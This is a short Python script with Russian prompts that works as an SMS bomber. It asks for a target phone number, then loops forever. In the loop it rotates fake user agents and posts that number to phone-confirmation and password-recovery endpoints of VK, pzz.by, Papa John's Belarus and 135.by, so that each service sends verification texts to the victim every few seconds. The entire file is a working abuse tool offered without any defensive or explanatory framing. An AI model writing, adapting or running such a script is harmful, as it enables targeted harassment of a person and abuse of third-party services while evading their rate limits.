import requests, fake_useragent, time
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Ведите номер телефона в таком формате +375 44 123-12-12:')
NUMBER2 = input('Ведите номер телефона в таком формате +375441231212:')

while True:
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}
    try:
        response = requests.post('https://vk.com/activation.php?act=change_phone_phone', headers = headers, data = {'phone': NUMBER2})
        print('успешно отправленно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://pzz.by/api/v1/clients/password', headers = headers, data = {'phone' : NUMBER2})
        print('Сообщение высланно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://api.papajohns.by/user/confirm-code', headers = headers, 
                                                    json = {'lang': "ru", 'city_id': "1", 'platform': "web", 'type': "recovery_password", 'phone': NUMBER2})
        print('Отправленно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://api.vk.com/method/auth.validatePhone?v=5.148&client_id=7733222', headers = headers, data = {'phone':NUMBER })
        print('успешно отправленно')
    except:
        print('что то пошло не так')       
    try:
        response = requests.post('https://auth.135.by/api/client/sms', headers = headers,json= {'phone': NUMBER})
        print('отправка прошла успешно')
    except: 
        print('что то пошло не так')
    time.sleep(5)        